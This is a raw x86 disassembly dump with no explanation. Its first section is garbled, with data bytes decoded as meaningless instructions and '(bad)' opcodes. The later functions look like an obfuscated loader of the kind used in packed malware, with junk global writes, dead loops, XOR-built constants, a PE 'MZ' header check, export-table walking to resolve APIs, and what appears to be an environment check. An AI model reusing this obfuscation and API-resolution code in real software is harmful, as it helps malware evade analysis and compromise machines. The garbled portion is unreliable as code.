  422221:	ret    
  422222:	mov    ds:0x342825d3,eax
  422227:	fsub   QWORD PTR [ebx]
  422229:	mov    ds:0x8db47663,eax
  42222e:	call   0xd90e:0x6ced3c32
  422235:	fcom   QWORD PTR [edi-0x5aa717f3]
  42223b:	test   BYTE PTR [eax+0x197159bd],ah
  422241:	in     al,0x33
  422243:	mov    bl,0xb5
  422245:	mov    edi,0xf5f4d3a3
  42224a:	push   0x24a225ac
  42224f:	ds xor BYTE PTR ss:[ebx+0x15],ch
  422254:	enter  0x7acb,0xa3
  422258:	jecxz  0x422270
  42225a:	stc    
  42225b:	sbb    edi,DWORD PTR [ecx+0x2b]
  42225e:	cmp    BYTE PTR [esi],0x41
  422261:	sahf   
  422262:	jg     0x4221fc
  422264:	mov    ecx,0x9c9f86c5
  422269:	pop    ss
  42226a:	xchg   ecx,eax
  42226b:	in     al,0x87
  42226d:	pusha  
  42226e:	xchg   edx,eax
  42226f:	cmp    dl,BYTE PTR [edx+0x15]
  422272:	jmp    0x55e4b5e5
  422277:	pavgw  mm0,mm1
  42227a:	push   edi
  42227b:	mov    ch,0x49
  42227d:	loope  0x4222c2
  42227f:	xlat   BYTE PTR ds:[ebx]
  422280:	out    0x65,eax
  422282:	sbb    eax,0x96e61919
  422287:	dec    ebp
  422288:	ss clc 
  42228a:	clc    
  42228b:	mov    ebx,0x34e461e3
  422290:	fnstenv [edi-0x4f6b53e0]
  422296:	dec    esp
  422297:	xor    eax,0x443adb3f
  42229c:	xchg   edx,eax
  42229d:	test   BYTE PTR [edx+0x8],ah
  4222a0:	pop    es
  4222a1:	sub    BYTE PTR [eax+0x140b41c1],cl
  4222a7:	scas   al,BYTE PTR es:[edi]
  4222a8:	inc    esi
  4222a9:	enter  0xba1e,0x97
  4222ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ae:	sub    edi,ebx
  4222b0:	lahf   
  4222b1:	cmp    ebp,DWORD PTR [ebp-0x47a7f8e2]
  4222b7:	test   BYTE PTR [edx],cl
  4222b9:	leave  
  4222ba:	test   al,0xb2
  4222bc:	sbb    eax,0x33e2ce94
  4222c1:	leave  
  4222c2:	jg     0x422246
  4222c4:	pop    ss
  4222c5:	add    esi,0x59
  4222c8:	bound  ebx,QWORD PTR [ebp-0x4320ebdf]
  4222ce:	int3   
  4222cf:	dec    eax
  4222d0:	xor    ecx,DWORD PTR gs:[ecx-0x7a469f23]
  4222d7:	jbe    0x4222bc
  4222d9:	mov    cs,WORD PTR [ecx+ebp*2-0x62]
  4222dd:	pop    esp
  4222de:	fldenv ds:0x1c5a00d5
  4222e5:	fsubr  QWORD PTR [esi+0x50]
  4222e8:	lods   eax,DWORD PTR ds:[esi]
  4222e9:	mov    esi,esp
  4222eb:	in     eax,dx
  4222ec:	add    DWORD PTR [ebp+ebx*1-0x67a15e70],ebp
  4222f3:	and    al,0xf5
  4222f5:	and    DWORD PTR [esi-0x25],ecx
  4222f8:	test   DWORD PTR [edx+0x35d6aa6e],eax
  4222fe:	or     dl,dh
  422300:	fimul  WORD PTR [eax+0x523cec2f]
  422306:	loope  0x4222ca
  422308:	sub    eax,0x2c6d95ec
  42230d:	inc    eax
  42230e:	imul   ecx,DWORD PTR [ebx-0x3c13fbd8],0xd757b714
  422318:	jbe    0x4222aa
  42231a:	les    ebp,FWORD PTR [ecx-0x296ad06b]
  422320:	pushf  
  422321:	into   
  422322:	loope  0x4222d0
  422324:	test   al,0xec
  422326:	cs push 0x44194ea6
  42232c:	pop    es
  42232d:	inc    esp
  42232e:	rol    BYTE PTR [esi-0x18304252],0x1e
  422335:	xor    BYTE PTR [eax+0x755d82b9],0x16
  42233c:	bound  esp,QWORD PTR [ebx+edx*2+0x64cad242]
  422343:	in     eax,0x9e
  422345:	(bad)  
  422346:	lods   al,BYTE PTR ds:[esi]
  422347:	and    al,0x85
  422349:	mov    ebp,0x7b8eadc7
  42234e:	pushf  
  42234f:	cmp    ah,cl
  422351:	js     0x422300
  422353:	stos   DWORD PTR es:[edi],eax
  422354:	mov    eax,0xeb575272
  422359:	jo     0x4222e0
  42235b:	cmp    eax,0xbf4b2269
  422360:	xchg   ebx,eax
  422361:	scas   eax,DWORD PTR es:[edi]
  422362:	mov    eax,ds:0xb62a0f0c
  422367:	cdq    
  422368:	pop    esp
  422369:	cs cli 
  42236b:	pop    ecx
  42236c:	jb     0x422332
  42236e:	pop    edx
  42236f:	sbb    eax,0x7f85c3b
  422374:	call   0x3a662394
  422379:	mov    WORD PTR [eax-0x10ce0e06],gs
  42237f:	test   al,0x95
  422381:	lods   al,BYTE PTR ds:[esi]
  422382:	xor    al,0xc1
  422384:	test   DWORD PTR [edx+0x74],edx
  422387:	jne    0x422406
  422389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42238a:	das    
  42238b:	ret    0x6e8f
  42238e:	sub    eax,0x70a2bec0
  422393:	mov    dl,BYTE PTR [ecx-0x42e1bfc3]
  422399:	loope  0x422329
  42239b:	and    eax,DWORD PTR [eax+0x69]
  42239e:	xchg   edx,eax
  42239f:	xchg   ebp,eax
  4223a0:	and    eax,0xd897f23f
  4223a5:	call   0xe51d:0x96328dd5
  4223ac:	adc    bh,BYTE PTR [edi]
  4223ae:	or     dh,BYTE PTR [edi-0x59a7ad0c]
  4223b4:	jns    0x42236f
  4223b6:	dec    eax
  4223b7:	pop    es
  4223b8:	jbe    0x42239e
  4223ba:	repz mov edi,0xe66d00bd
  4223c0:	sbb    DWORD PTR [edx+0x799e19a1],ecx
  4223c6:	inc    ebx
  4223c7:	and    bl,BYTE PTR [ebp-0x10033647]
  4223cd:	leave  
  4223ce:	cmp    ebx,DWORD PTR [ebx+0x20]
  4223d1:	xor    al,0xdc
  4223d3:	ins    DWORD PTR es:[edi],dx
  4223d4:	(bad)  
  4223d5:	adc    esi,DWORD PTR [edx+0x30]
  4223d8:	mov    fs,WORD PTR [ecx]
  4223da:	push   esi
  4223db:	(bad)  
  4223dd:	int3   
  4223de:	adc    DWORD PTR [edi],0x4f
  4223e1:	jp     0x4223a9
  4223e3:	cwde   
  4223e4:	mov    al,0x7b
  4223e6:	ja     0x4223b2
  4223e8:	ins    WORD PTR es:[edi],dx
  4223ea:	push   edx
  4223eb:	add    BYTE PTR [esi-0x3],cl
  4223ee:	mov    al,0xa2
  4223f0:	cmp    BYTE PTR [ebp+0x58],ah
  4223f3:	fld    QWORD PTR [edi]
  4223f5:	std    
  4223f6:	stos   DWORD PTR es:[edi],eax
  4223f7:	stos   DWORD PTR es:[edi],eax
  4223f8:	mov    al,0xd2
  4223fa:	imul   ebp,DWORD PTR [esi-0x3e3b8d93],0x3c
  422401:	(bad)  
  422402:	lock out 0x64,al
  422405:	cmp    ecx,DWORD PTR [eax]
  422407:	imul   ebp,DWORD PTR [eax+eax*1-0x34],0xffffffd1
  42240c:	mov    bl,dh
  42240e:	fwait
  42240f:	inc    esp
  422410:	das    
  422411:	sahf   
  422412:	les    ecx,FWORD PTR [ebx+ebp*4]
  422415:	dec    ecx
  422416:	xor    BYTE PTR [ebx],bh
  422418:	xchg   ecx,eax
  422419:	in     al,dx
  42241a:	jnp    0x4223c5
  42241c:	lahf   
  42241d:	ja     0x4223b1
  42241f:	mov    edx,0xa65adc1b
  422424:	jno    0x4223dd
  422426:	xchg   edi,eax
  422427:	out    dx,al
  422428:	fst    DWORD PTR [eax-0x5493e4f1]
  42242e:	mov    eax,0x142f9701
  422433:	adc    al,0xd4
  422435:	data16 ins BYTE PTR es:[edi],dx
  422437:	imul   esi,DWORD PTR ds:0x5d19ab97,0xffffff86
  42243e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42243f:	and    esp,esi
  422441:	mov    esp,0x9fb07232
  422446:	call   0xedad:0xa21846da
  42244d:	mov    esi,0xb612a10b
  422452:	scas   al,BYTE PTR es:[edi]
  422453:	and    esi,edi
  422455:	jne    0x422491
  422457:	pop    ss
  422458:	xor    DWORD PTR [ecx-0x69],ecx
  42245b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42245c:	add    dh,BYTE PTR [ebp+0x38c7509b]
  422462:	inc    ecx
  422463:	pop    edx
  422464:	dec    ebx
  422465:	ror    DWORD PTR [ebx],1
  422467:	sti    
  422468:	mov    ds:0x9f64d92c,eax
  42246d:	enter  0xae02,0x79
  422471:	icebp  
  422472:	retf   0xb3ea
  422475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422476:	rcr    DWORD PTR [eax],1
  422478:	popf   
  422479:	sbb    esi,ecx
  42247b:	cmp    al,0x4c
  42247d:	repz xlat BYTE PTR ds:[ebx]
  42247f:	mov    edx,DWORD PTR [ebx]
  422481:	lahf   
  422482:	outs   dx,BYTE PTR ds:[esi]
  422483:	xchg   ebx,eax
  422484:	pop    es
  422485:	into   
  422486:	test   DWORD PTR [esi-0x25e9157b],0x7d439644
  422490:	xor    bl,al
  422492:	xor    al,BYTE PTR [ecx]
  422494:	add    eax,0x35f14c7d
  422499:	jae    0x4224a6
  42249b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249c:	sahf   
  42249d:	sub    al,0xff
  42249f:	jne    0x42247d
  4224a1:	mov    BYTE PTR [eax],0xe9
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
